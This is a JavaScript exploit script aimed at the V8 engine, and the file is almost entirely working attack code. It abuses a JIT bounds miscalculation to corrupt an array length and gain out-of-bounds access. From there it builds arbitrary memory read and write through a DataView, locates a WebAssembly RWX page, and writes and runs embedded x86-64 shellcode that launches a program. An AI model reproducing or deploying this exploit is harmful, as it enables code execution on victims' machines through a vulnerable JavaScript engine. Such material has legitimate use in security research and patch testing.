var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

var arraybuf = new ArrayBuffer(0x12333);

function f2i(f)
{
	float64[0] = f;
	return BigInt(Uint32[0]) + (BigInt(Uint32[1]) << 32n);
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}


function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double = new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];

var obj;
var corrupting_array;
var corrupted_array;

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0); // [1]

  corrupting_array = [0.1, 0.1];
  corrupted_array = [0.1];
  obj = {mark: 0xdead, obj: wasmInstance};
  
  corrupting_array[x] = length_as_double;

  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

var oob_array = trigger(giant_array)[1];

console.log("[+] conrrupted array length : 0x" + hex(oob_array.length));


gc();

var backing_store_idx = 0;
var search_space = [[0x8902000/8, (0x8940000/8)-1], [0x8213000/8, (0x8280000/8)-1], [(0x8040000-8)/8, 0x805b000/8], [0x8100000/8, (0x818d000/8)-1], [0x8740000/8, (0x8900000/8)-1], [0x8901000/8, (0x8940000/8)-1]];

for(let i = 0; i < search_space.length; i++)
{
	var find = 0;
	for(let j = search_space[i][0]; j < search_space[i][1]; j++)
	{
		if((f2i(oob_array[j]) & 0xffffffffn) == 0x12333n /*|| ((f2i(oob_array[j])) >> 32n) == 0x12333n*/){
			backing_store_idx = j + 1;
			console.log("[+] find backing_store : 0x" + hex(f2i(oob_array[backing_store_idx])));
			if(((f2i(oob_array[j+1])) & 0xfffn) == 0x0n){
				find = 1;
				break;
			}
		}
		else if(((f2i(oob_array[j])) >> 32n) == 0x12333n){
			backing_store_idx = j;
		}
	}
	if(find == 1) break;
}

var data_view = new DataView(arraybuf);

function dataview_read64(addr)
{
	oob_array[backing_store_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	oob_array[backing_store_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

for(let i = 0; i < search_space.length; i++)
{
	var find = 0;
	for(let j = search_space[i][0]; j < search_space[i][1]; j++)
	{
		if((f2i(oob_array[j]) & 0xffffffffn) == 0x0001bd5an ){ // 0x1bd5a = 0xdead *2
			var wasmfunc_addr_idx = j;
			var wasmfunc_addr = (f2i(oob_array[wasmfunc_addr_idx])) >> 32n;
			console.log("[+] leak wasm_func_addr : 0x" + hex(f2i(oob_array[j])));
			console.log("[+] find wasm_func_addr : 0x" + hex(wasmfunc_addr));
			find = 1;
			break;
		}
	}
	if(find == 1) break;
}

var wasm_rwx_idx = Number((wasmfunc_addr -1n +0x68n)/8n);
console.log("[+] find wasm_rwx_idx: 0x" + hex(wasm_rwx_idx*8));
var wasm_rwx_addr_low = (f2i(oob_array[wasm_rwx_idx-1])) >> 32n;
console.log("[+] find wasm_rwx_addr_low : 0x" + hex(wasm_rwx_addr_low));

if((wasm_rwx_addr_low & 0xfffn) != 0x000n){
	var wasm_rwx_addr = (f2i(oob_array[wasm_rwx_idx-1]));
	console.log("[+] find wasm_rwx_addr: 0x" + hex(wasm_rwx_addr));
}else{
	var wasm_rwx_addr_high = ((f2i(oob_array[wasm_rwx_idx])) & 0xffffffffn) << 32n;
	console.log("[+] find wasm_rwx_addr_high : 0x" + hex(wasm_rwx_addr_high));
	wasm_rwx_addr = wasm_rwx_addr_high + wasm_rwx_addr_low;
	console.log("[+] find wasm_rwx_addr : 0x" + hex(wasm_rwx_addr));
}

dataview_write(wasm_rwx_addr, shellcode);
//%DebugPrint(arraybuf);
wasm_function();